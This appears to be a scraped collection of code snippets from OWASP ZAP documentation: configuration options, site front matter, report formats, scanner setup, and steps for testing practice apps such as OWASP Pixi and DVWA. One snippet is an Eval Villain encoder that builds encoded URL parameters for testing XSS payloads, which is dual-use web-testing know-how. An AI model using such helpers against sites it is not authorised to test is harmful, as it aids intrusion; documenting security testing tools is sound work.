DESCRIPTION: Demonstrates how to set basic configuration values using the -config parameter in ZAP's command line interface.

LANGUAGE: bash
CODE:
-config api.key=12345 -config network.connection.timeoutInSecs=60

----------------------------------------

TITLE: YAML Frontmatter Configuration for WAFP Extension Documentation
DESCRIPTION: YAML configuration block defining metadata for the WAFP extension documentation page, including title, type, weight, addon details and deprecation status.

LANGUAGE: yaml
CODE:
title: WAFP Extension
type: userguide
weight: 1
cascade:
  addon:
    id: cmss
    version: 3.0.0
deprecated: true

----------------------------------------

TITLE: Displaying Charts with Hugo Shortcode
DESCRIPTION: Hugo shortcode for creating charts using Google Charts and data files.

LANGUAGE: html
CODE:
chart.html

----------------------------------------

TITLE: XML Configuration Structure Example
DESCRIPTION: Shows the XML structure for scanner thread configuration in ZAP's config.xml file.

LANGUAGE: xml
CODE:
<scanner><threadPerHost>2</threadPerHost></scanner>

----------------------------------------

TITLE: YAML Frontmatter Configuration for VulnCheck Documentation
DESCRIPTION: YAML frontmatter configuration block defining metadata for the VulnCheck add-on documentation page, including title, type, weight, add-on ID, version and deprecated status.

LANGUAGE: yaml
CODE:
# This page was generated from the add-on.
title: VulnCheck
type: userguide
weight: 1
cascade:
  addon:
    id: vulncheck
    version: 2.0.0
deprecated: true

----------------------------------------

TITLE: Eval Villain's Encoder Function for Decoding Complex Parameters
DESCRIPTION: Shows the encoder function generated by Eval Villain to decode and re-encode complex parameters. This function helps in reproducing the encoding process for testing potential XSS payloads.

LANGUAGE: javascript
CODE:
encoder = (x, y) => {
    x = btoa(x);
    {
        let _ = {"stuff":[1,2,3,{"morestuff":[false,{"username":"YWRtaW4="}]}]};
        _["stuff"][3]["morestuff"][1]["username"]= x;
        x = JSON.stringify(_);
    }
    x = encodeURIComponent(x);
    x = encodeURIComponent(x);
    x = btoa(x);
    let _ = new URL(window.location.href);
    // next line might need some changes
    _.searchParams.set('url_param', decodeURIComponent(x));
    x = {href: _.href, param: x};
    if (y) window.location = x.href;
    return x;
}//

----------------------------------------

TITLE: Quick Scan Attack Error Message
DESCRIPTION: The error message displayed when ZAP Quick Start Attack fails to process a URL

LANGUAGE: text
CODE:
Failed to attack the URL, please check that the URL is valid

----------------------------------------

TITLE: Configuring Token Generator Options in ZAP Config File
DESCRIPTION: This snippet shows the configuration file keys and values for setting the number of threads and request delay for the Token Generator. These settings control the performance and behavior of the token generation process.

LANGUAGE: markdown
CODE:
| Number of Threads               | The number of threads used during the token generation.                                                                                                                                                                                                 | 5       | Key: `tokengen.threadsPerScan` Value: a non-negative integer.   |
| Request Delay (in milliseconds) | The time to wait before sending each request, to avoid overloading the target server. **Note:** Given the high number of requests sent during the Token Generation increasing the delay might have a high impact on the time that the generation will take to complete. | 0       | Key: `tokengen.requestDelayInMs` Value: a non-negative integer. |

----------------------------------------

TITLE: Markdown Blog Post Structure - Spider Update
DESCRIPTION: YAML frontmatter and markdown structure for a blog post announcing spider updates, including metadata like title, date, authors and image references

LANGUAGE: markdown
CODE:
---
title: "Spider News"
summary: >
  News about changes to the Traditional Spider for the up-coming release.
images:
- https://www.zaproxy.org/blog/2022-08-30-spider-move/images/zapbot.spider.png
addSocialPreview: true
type: post
date: "2022-08-30"
authors:
    - thorin
---

----------------------------------------

TITLE: YAML Redirect Configuration for Docker Hub
DESCRIPTION: YAML front matter configuration that sets up a redirect from a local Docker page to the ZAP Docker Hub search results

LANGUAGE: yaml
CODE:
---
title: Docker
layout: redirect
url: /docker/
redirect: https://hub.docker.com/search?q=zaproxy%2Fzap&type=image
---

----------------------------------------

TITLE: Configuring Headless Mode in YAML
DESCRIPTION: YAML front matter block that enables headless mode operation by setting the headless flag to true.

LANGUAGE: yaml
CODE:
---
headless: true
---

----------------------------------------

TITLE: Updating ZAP and Installing Add-ons
DESCRIPTION: Command to update ZAP and install the Wappalyzer and Beta Passive Scan Rules add-ons.

LANGUAGE: bash
CODE:
./zap.sh -cmd -addonupdate -addoninstall wappalyzer -addoninstall pscanrulesBeta

----------------------------------------

TITLE: Configuring GitHub Redirect for ZAP using YAML Front Matter
DESCRIPTION: This YAML front matter configuration sets up a redirect page for the ZAP (Zed Attack Proxy) GitHub repository. It specifies the page title, layout type, and the target URL for redirection.

LANGUAGE: yaml
CODE:
---
title: GitHub
layout: redirect
url: /github/
redirect: https://github.com/zaproxy/
---

----------------------------------------

TITLE: Configuring Headless Mode for ZAP Proxy
DESCRIPTION: This YAML configuration snippet sets the 'headless' property to true, indicating that the ZAP Proxy should run in headless mode without a graphical user interface.

LANGUAGE: yaml
CODE:
---
headless: true
---

----------------------------------------

TITLE: Basic ZAP Security Scan Implementation in C#
DESCRIPTION: Simple implementation of a ZAP baseline security scan using xUnit test framework. The test sets up the application and executes a basic security scan.

LANGUAGE: java
CODE:
[Fact]
public Task BasicSecurityScanShouldPass() =>
    ExecuteTestAfterSetupAsync(context =>
        context.RunAndAssertBaselineSecurityScanAsync());

----------------------------------------

TITLE: Configuring IRC Redirect for ZAP Project in YAML
DESCRIPTION: This YAML configuration sets up a page redirect for IRC links. It specifies the title, layout, original URL, and the target redirect URL for the ZAP project's IRC channel on Libera.Chat.

LANGUAGE: yaml
CODE:
---
title: IRC
layout: redirect
url: /irc/
redirect: https://web.libera.chat/#zaproxy
---

----------------------------------------

TITLE: Configuring ZAPCon 2022 Video Links in YAML
DESCRIPTION: YAML configuration file defining the video links and metadata for ZAPCon 2022 presentations. Each entry includes a title and YouTube UUID for embedding purposes.

LANGUAGE: yaml
CODE:
type: page
title: ZAPCon 2022 Videos
layout: youtube-videos
links:
  - name: 'ZAP for Everybody'
    uuid: 32W_hm30dsg

  - name: 'The OWASP Top Ten 2021 and ZAP'
    uuid: g-NDruzJzpM

  - name: 'Out-of-band Application Security Testing with ZAP'
    uuid: 6tkraWH4bwY

  - name: 'More Power to "ZAP" - Demystifying ZAP Add-ons'
    uuid: N4OEtVCda6s

  - name: 'ZAP Project Updates'
    uuid: xwoefXhOW6k

  - name: 'Modern Approaches to Application Security (Panel)'
    uuid: rpvsqxZwbhs

  - name: 'The Final Frontier, Automating Dynamic Security Testing'
    uuid: TXjSBHFLfHA

  - name: 'Drive-By Pentesting with ZAP Scripts'
    uuid: AqZdqAK9S2g

  - name: 'ZAP Integration and Automation (Panel)'
    uuid: XaVxKARC4_k

  - name: 'API Security Testing (Workshop)'
    uuid: l0ISDMUpm68

  - name: 'How to Contribute to ZAP (Workshop)'
    uuid: M2fWFvLZLwI

  - name: 'Automated Security Testing with GitHub Actions (Workshop)'
    uuid: V864fLPct-o

----------------------------------------

TITLE: Signing the ZAP Contributor License Agreement
DESCRIPTION: This snippet shows the exact text that contributors need to reply with to sign the CLA when prompted by the GitHub action.

LANGUAGE: markdown
CODE:
I have read the CLA Document and I hereby sign the CLA

----------------------------------------

TITLE: Configuring Jekyll Redirect for ZAP Slack Invite
DESCRIPTION: YAML front matter configuration for a Jekyll page that redirects users to the ZAP project's Slack team invitation link. It specifies the page title, layout type, source URL, and the target Slack invitation URL.

LANGUAGE: yaml
CODE:
---
title: Slack Invite
layout: redirect
url: /slack/invite
redirect: https://join.slack.com/t/zaproxy/shared_invite/zt-30q7gl3xs-Jf8dx1kAm4S8Eto4~nGrWA
---

----------------------------------------

TITLE: Defining ZAPCon 2021 Video Links in YAML
DESCRIPTION: This YAML snippet defines the page type, title, layout, and a list of video links from the ZAPCon 2021 conference. Each link includes a name and a YouTube video UUID.

LANGUAGE: yaml
CODE:
type: page
title: ZAPCon 2021 Videos
layout: youtube-videos
links:
  - name: 'The whole conference (4½ hours)'
    uuid: xlt---D9I3w

  - name: 'Democratizing ZAP with Test Automation and DSLs'
    uuid: jimW-R6_F4U

  - name: 'ZAP Project Updates'
    uuid: aZmS9NiQlJA

  - name: 'Mobile Application Security Testing with ZAP'
    uuid: KWofjrHNNqs

  - name: 'ZAP in Pakistani Fintech'
    uuid: VeBbHBow9kQ

  - name: 'Enhancing ZAP with Feedback Based Fuzzing'
    uuid: 5Hq0sPbhnDQ

  - name: 'Starting a Security Program on a Shoestring (with ZAP)'
    uuid: Gyf0XZRDBAM

  - name: 'Simon Bennetts Ask Me Anything'
    uuid: 6e4_m1Zm6LY

----------------------------------------

TITLE: Alert Configuration YAML for Cookie SameSite Attribute Check
DESCRIPTION: YAML configuration defining the alert properties for detecting cookies with SameSite=None. Includes risk level, solution recommendations, and related security standard references.

LANGUAGE: yaml
CODE:
title: "Cookie with SameSite Attribute None"
alertid: 10054-2
alertindex: 1005402
alerttype: "Passive"
alertcount: 3
status: release
type: alert
risk: Low
solution: "Ensure that the SameSite attribute is set to either 'lax' or ideally 'strict' for all cookies."
references:
   - https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site
other: ""
cwe: 1275
wasc: 13
alerttags: 
  - CWE-1275
  - OWASP_2017_A05
  - OWASP_2021_A01
  - WSTG-v42-SESS-02
code: https://github.com/zaproxy/zap-extensions/blob/main/addOns/pscanrules/src/main/java/org/zaproxy/zap/extension/pscanrules/CookieSameSiteScanRule.java
linktext: "org/zaproxy/zap/extension/pscanrules/CookieSameSiteScanRule.java"
help: https://www.zaproxy.org/docs/desktop/addons/passive-scan-rules/#id-10054

----------------------------------------

TITLE: Polling BOAST Servers in JavaScript for OWASP ZAP
DESCRIPTION: This snippet demonstrates how to poll all registered BOAST servers and how to change the automatic polling frequency in seconds.

LANGUAGE: javascript
CODE:
boast.poll()

boast.getParam().setPollingFrequency(30)

----------------------------------------

TITLE: Markdown Video Series Configuration
DESCRIPTION: YAML frontmatter configuration for ZAP Chat video series webpage, defining video titles and UUIDs for YouTube integration

LANGUAGE: markdown
CODE:
---
type: page
title: ZAP Chat Videos
layout: youtube-videos
featured: OkELONAQyAY
links:
  - name: '01 Introduction'
    uuid: qrAJ32rdi14

  - name: '02 Authentication Tester'
    uuid: RCi9W77bGpI

  - name: '03 Break Points'
    uuid: cKG4UWa082A

  - name: '04 ZAPit'
    uuid: 9RbmkT9rG5w

  - name: '05 Modern Apps Part 1'
    uuid: Rq_d7OLmMfw

  - name: '06 Automation Introduction'
    uuid: PnCbIAnauD8

  - name: '07 Automation Framework Part 1 - Introduction'
    uuid: 19Rptj2be1Y

  - name: '08 Automation Framework Part 2 - Environment'
    uuid: 1fcpU54N-mA

  - name: '09 Automation Framework Part 3 - Requests'
    uuid: 4phnMy9iCPY

  - name: '10 Automation Framework Part 4 - Spidering'
    uuid: WivoyVerBCo

  - name: '11 Automation Framework Part 5 - APIs'
    uuid: xuP00Ri460k

  - name: '12 Automation Framework Part 6 - Delays and Active Scan'
    uuid: hcftgjz_Vgc

  - name: '13 2023 Review'
    uuid: VPVuxftv99A

  - name: '14 Google Summer of Code'
    uuid: Cm_ol-PA738

  - name: '15 New Web GUI?'
    uuid: s8DKKTTHsGM

  - name: '16 Automation Framework Part 7 - Authentication'
    uuid: _CKzFqDi33A

  - name: '17 Fuzz AI Files'
    uuid: hZ9yeXK2DLY

  - name: '18 Antero, The New ZAP Project Manager'
    uuid: 7kqg7x7d6os

  - name: '19 Release 2.16.0'
    uuid: o_IgsCaaQMo

  - name: '20 Client Spider'
    uuid: OkELONAQyAY
---

----------------------------------------

TITLE: Including Sequence Scanning Results in ZAP JSON Report
DESCRIPTION: This snippet shows how sequence scanning results are included in the ZAP JSON report. It details the structure for reporting sequence steps, including original and replay requests/responses, and associated alerts.

LANGUAGE: json
CODE:
"sequences": [
      {
        "name": "Seq name",
        "steps": [
          {
            "step": "1",
            "pass": "true",
            "resultDetails": "Pass",
            "alertIds": [],
            "original": {
              "uri": "https://www.example.com/step1",
              "method": "GET",
              "request-header": "GET https://www.example.com/step1 HTTP/1.1\r\nhost: www.example.com\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\r\npragma: no-cache\r\ncache-control: no-cache\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "request-body": "\x0000\x0013",
              "response-header": "HTTP/1.0 0\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "response-body": "\x0000\x0013"
            },
            "replay": {
              "uri": "https://www.example.com/step1",
              "method": "GET",
              "request-header": "GET https://www.example.com/step1 HTTP/1.1\r\nhost: www.example.com\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\r\npragma: no-cache\r\ncache-control: no-cache\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "request-body": "\x0000\x0013",
              "response-header": "HTTP/1.0 0\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "response-body": "\x0000\x0013"
            }
          },
          {
            "step": "2",
            "pass": "false",
            "resultDetails": "Fail",
            "alertIds": [
              2,
              4
            ],
            "original": {
              "uri": "https://www.example.com/step2",
              "method": "GET",
              "request-header": "GET https://www.example.com/step2 HTTP/1.1\r\nhost: www.example.com\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\r\npragma: no-cache\r\ncache-control: no-cache\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "request-body": "\x0000\x0013",
              "response-header": "HTTP/1.0 0\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "response-body": "\x0000\x0013"
            },
            "replay": {
              "uri": "https://www.example.com/step2",
              "method": "GET",
              "request-header": "GET https://www.example.com/step2 HTTP/1.1\r\nhost: www.example.com\r\nuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0\r\npragma: no-cache\r\ncache-control: no-cache\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "request-body": "\x0000\x0013",
              "response-header": "HTTP/1.0 0\r\nTest: Foo-Header\x0000\x0013\r\n\r\n",
              "response-body": "\x0000\x0013"
            }
          }
        ]
      }
    ]

----------------------------------------

TITLE: Generating OAS Output with Noir for Automated Scanning
DESCRIPTION: This command shows how to use Noir to generate OAS (OpenAPI Specification) output, which can be used by ZAP for automated scanning. It analyzes the source code and produces a JSON file containing endpoint information.

LANGUAGE: sh
CODE:
noir -b <SOURCE> -f oas3 --no-log -o <OUTPUT>

----------------------------------------

TITLE: Configuring Search Page in YAML for zaproxy Project
DESCRIPTION: This YAML configuration sets up the search page for the zaproxy project. It specifies the title, date, layout, output formats, and disables search indexing for this page.

LANGUAGE: yaml
CODE:
---
title: "Search"
date: 2018-09-04T15:32:54+02:00
layout: "search"
outputs: ["json", "html"]
noindex: true
---

----------------------------------------

TITLE: Traditional PDF Report Structure - Markdown Table
DESCRIPTION: A markdown table defining the main sections of the Traditional PDF report format, including Alert Count, Instance Count, and Alert Details sections with their corresponding IDs.

LANGUAGE: markdown
CODE:
| Section        | Id            |
|:---------------|:--------------|
| Alert Count    | alertcount    |
| Instance Count | instancecount |
| Alert Details  | alertdetails  |

----------------------------------------

TITLE: Podinfo Deployment Configuration
DESCRIPTION: Kubernetes deployment and service configuration for the test application podinfo

LANGUAGE: yaml
CODE:
apiVersion: apps/v1
kind: Deployment
metadata:
  name: podinfo
  namespace: zap-demo
spec:
  selector:
    matchLabels:
      app: podinfo
  template:
    metadata:
      labels:
        app: podinfo
    spec:
      containers:
      - name: podinfod
        image: ghcr.io/stefanprodan/podinfo:6.7.0
        ports:
        - name: http
          containerPort: 9898
          protocol: TCP
        command:
        - ./podinfo
        - --port=9898
        - --level=info
---
apiVersion: v1
kind: Service
metadata:
  name: podinfo
  namespace: zap-demo
spec:
  type: ClusterIP
  selector:
    app: podinfo
  ports:
    - name: http
      port: 9898
      protocol: TCP
      targetPort: http

----------------------------------------

TITLE: Generating OWASP ZAP XML Security Report
DESCRIPTION: Sample XML report from OWASP ZAP showing security findings including cookie-based vulnerabilities. The report contains detailed information about alerts, HTTP requests/responses, and references to security standards like OWASP Top 10.

LANGUAGE: xml
CODE:
<?xml version="1.0"?>
<OWASPZAPReport version="2.11.1" generated="Fr., 30 Sep. 2022 08:40:35">
    <site name="http://localhost:8080" host="localhost" port="8080" ssl="false">
        <alerts>
            <alertitem>
                <pluginid>90027</pluginid>
                <alertRef>90027</alertRef>
                <alert>Cookie Slack Detector</alert>
                <name>Cookie Slack Detector</name>
                <riskcode>1</riskcode>
                <confidence>1</confidence>
                <riskdesc>Low (Low)</riskdesc>
                <!-- Additional XML content truncated for brevity -->
            </alertitem>
        </alerts>
    </site>
</OWASPZAPReport>

----------------------------------------

TITLE: Viewing Available Templates in ZAP Report Generation API
DESCRIPTION: This API view operation allows users to see all available report templates.

LANGUAGE: markdown
CODE:
* templates: View available templates.

----------------------------------------

TITLE: Implementing Selective Proxying with PAC File Configuration
DESCRIPTION: A Proxy Auto-Configuration (PAC) file that routes traffic for *.example.org through ZAP proxy while sending all other traffic directly. The function uses shExpMatch for pattern matching against hostnames.

LANGUAGE: javascript
CODE:
function FindProxyForURL(url, host) {
    if (shExpMatch(host, "*.example.org")) {
        return "PROXY localhost:8080"; //Use ZAP for *.example.org
    }
    // Go directly to the WWW for everything else
    return "DIRECT";
}

----------------------------------------

TITLE: Sending WebSocket Text Message Action in Markdown
DESCRIPTION: Describes the 'sendTextMessage' action for sending messages on a specified channel, including mandatory parameters channelId, outgoing, and message.

LANGUAGE: markdown
CODE:
### sendTextMessage

Mandatory Parameters:

* channelId: the channel identifier
* outgoing: 'True' if the message is to be sent to the server and 'False' if it is to be sent to the client
* message: the message to send

Sends the specified message on the specified channel.  
The channelId can be discovered via the 'channels' view.  

----------------------------------------

TITLE: Generating Reports in ZAP Report Generation API
DESCRIPTION: This API action allows users to generate a report with various customizable parameters. It includes options for title, template, theme, description, contexts, sites, sections, confidences, risks, file naming, and display options.

LANGUAGE: markdown
CODE:
* generate (title\* template\* theme description contexts sites sections includedConfidences includedRisks reportFileName reportFileNamePattern reportDir display): Generate a report with the supplied parameters.
    * title: Report Title
    * template: Report Template
    * theme: Report Theme
    * description: Report Description
    * contexts: The name of the contexts to be included in the report, separated by '|'. For example, "Default Context|My Context".
    * sites: The site URLs that should be included in the report, separated by '|'.
    * sections: The report sections that should be included, separated by '|'. View section names via API view `templateDetails
        (template*)`
    * includedConfidences: Confidences that should be included in the report, separated by '|'. Accepted values are "False Positive", "Low", "Medium", "High", and "Confirmed".
    * includedRisks: Risks that should be included in the report, separated by '|'. Accepted values are "Informational", "Low", "Medium", and "High".
    * reportFileName: The file name of the generated report. This value overrides the reportFileNamePattern parameter.
    * reportFileNamePattern: Report File Name Pattern. For example, `{{yyyy-MM-dd}}-ZAP-Report-[[site]]`.
    * reportDir: Path to directory in which the generated report should be placed.
    * display: Display the generated report. Either "true" or "false".

----------------------------------------

TITLE: Modifying ZAP Startup Script for macOS
DESCRIPTION: This code snippet shows how to modify the zap.sh script on macOS to use the system JRE instead of the bundled one. It involves commenting out specific lines in the script located under /Applications/OWASP ZAP.app/Contents/Java.

LANGUAGE: bash
CODE:
#if [ "$OS" = "Darwin" ]; then
#  if [ -e ../PlugIns/jre*/Contents/Home/bin/java ]; then
#    pushd ../PlugIns/jre*/Contents/Home/bin > /dev/null
#    JAVA_PATH=`pwd -P`
#    PATH="$JAVA_PATH:$PATH"
#    popd > /dev/null
#  fi
#fi

----------------------------------------

TITLE: Running ZAP from Source
DESCRIPTION: This command uses Gradle to run ZAP from the source code after installing the mandatory add-ons.

LANGUAGE: bash
CODE:
./gradlew run

----------------------------------------

TITLE: Installing DVWA using Docker
DESCRIPTION: Commands to clone the DVWA repository and start the application using Docker Compose. Users should verify these commands for potential updates.

LANGUAGE: bash
CODE:
git clone https://github.com/digininja/DVWA.git
cd DVWA
docker compose up -d

----------------------------------------

TITLE: Configuration File Content Example
DESCRIPTION: Shows the content format for a ZAP configuration file that can be used with the -configfile parameter.

LANGUAGE: bash
CODE:
replacer.full_list(0).description=auth1
replacer.full_list(0).enabled=true
replacer.full_list(0).matchtype=REQ_HEADER
replacer.full_list(0).matchstr=Authorization
replacer.full_list(0).regex=false
replacer.full_list(0).replacement=SBSBSB
replacer.full_list(1).description=auth2
replacer.full_list(1).enabled=true
replacer.full_list(1).matchtype=REQ_HEADER
replacer.full_list(1).matchstr=AnotherHeader
replacer.full_list(1).regex=false
replacer.full_list(1).replacement=BLAHBLAH

----------------------------------------

TITLE: Configuring ZAP Context for OWASP Pixi
DESCRIPTION: Steps to create and configure a ZAP context for testing OWASP Pixi, including URL inclusions, exclusions, and authentication settings.

LANGUAGE: markdown
CODE:
* Create "pixi" context (or edit the "Default Context"): 
    * "Include in Context": `http://localhost:8000.*` 
    * "Exclude from Context":  `http://localhost:8000/logout` 
    * "Flag as Context" > "pixi: Form-based Auth Login Request" `POST:login(pass,user)`.
    * Set "Username Parameter" as `user` and "Password Parameter" as `pass`.

----------------------------------------

TITLE: Complex Array Configuration Example
DESCRIPTION: Demonstrates how to configure array-based settings for the replacer functionality using command line parameters.

LANGUAGE: bash
CODE:
-config replacer.full_list\(0\).description=auth1 \
-config replacer.full_list\(0\).enabled=true \
-config replacer.full_list\(0\).matchtype=REQ_HEADER \
-config replacer.full_list\(0\).matchstr=Authorization \
-config replacer.full_list\(0\).regex=false \
-config replacer.full_list\(0\).replacement=SBSBSB \
-config replacer.full_list\(1\).description=auth2 \
-config replacer.full_list\(1\).enabled=true \
-config replacer.full_list\(1\).matchtype=REQ_HEADER \
-config replacer.full_list\(1\).matchstr=AnotherHeader \
-config replacer.full_list\(1\).regex=false \
-config replacer.full_list\(1\).replacement=BLAHBLAH

----------------------------------------

TITLE: NPM Package Management Commands
DESCRIPTION: Commands for managing npm dependencies, including security audits and package updates.

LANGUAGE: sh
CODE:
# Check for associated vulns
npm audit

# Check for packages
npm outdated

# Update a package
npm update @babel/core

----------------------------------------

TITLE: Setting Scanner Thread Configuration
DESCRIPTION: Shows how to set the scanner thread configuration using dot notation.

LANGUAGE: bash
CODE:
scanner.threadPerHost=2

----------------------------------------

TITLE: Querying GitHub for ZAP PRs
DESCRIPTION: This GitHub search query lists all non-automated closed ZAP PRs updated in a specific month. Replace the date with the desired month.

LANGUAGE: text
CODE:
org:zaproxy type:pr -author:zapbot -author:app/dependabot sort:updated-asc closed:2023-03 is:merged

----------------------------------------

TITLE: Running ZAP with Chrome in Docker
DESCRIPTION: This bash command runs the ZAP Docker image with Chrome, mounting the current directory and executing the Automation Framework plan.

LANGUAGE: bash
CODE:
docker run --rm -v "$(pwd)":/zap/wrk/:rw -it zap-chrome zap.sh -cmd -autorun /zap/wrk/chrome.yaml

----------------------------------------

TITLE: Creating Automation Framework Plan for ZAP
DESCRIPTION: This YAML file defines an Automation Framework plan for ZAP. It sets up a context, parameters, and a job to run the AJAX Spider with Chrome headless.

LANGUAGE: yaml
CODE:
---
env:
  contexts:
  - name: "Chrome Headless Test"
    urls:
    - "https://demo.owasp-juice.shop"
  parameters:
    failOnError: true
    failOnWarning: true
    progressToStdout: true
jobs:
- parameters:
    maxDuration: 1
    numberOfBrowsers: 1
    browserId: "chrome-headless"
  tests:
  - name: "At least one URL found"
    onFail: "WARN"
    statistic: "spiderAjax.urls.added"
    site: ""
    operator: ">="
    value: 20
    type: "stats"
  name: "spiderAjax"
  type: "spiderAjax"

----------------------------------------

TITLE: Running ZAP Spider on OWASP Pixi
DESCRIPTION: Steps to initiate a ZAP spider scan on OWASP Pixi using the configured user for authenticated crawling.

LANGUAGE: markdown
CODE:
* Back in the Sites tree, right click "http://localhost:8000" select "Attack" then "Spider...".
    * In the Spider dialog select `test` from the "User" dropdown menu.
    * Click "Start Scan".

----------------------------------------

TITLE: Setting Up ZAP User for OWASP Pixi
DESCRIPTION: Instructions for creating a ZAP user with specific credentials for authenticated testing of OWASP Pixi.

LANGUAGE: markdown
CODE:
* Open the "pixi" context and goto the "Users" panel.
    * Click "Add..."
    * Create a user as follows:
        * User Name: `test`
        * Username: `test@example.com`
        * Password: `testExample`

----------------------------------------

TITLE: Defining Hugo Frontmatter Template in YAML
DESCRIPTION: A YAML-formatted Hugo frontmatter template that automatically replaces hyphens with spaces in the title and includes basic metadata fields for blog posts.

LANGUAGE: yaml
CODE:
---
title: "{{ replace .Name "-" " " | title }}"
date: {{ .Date }}
draft: true
authors:
    - Simon Bennetts
---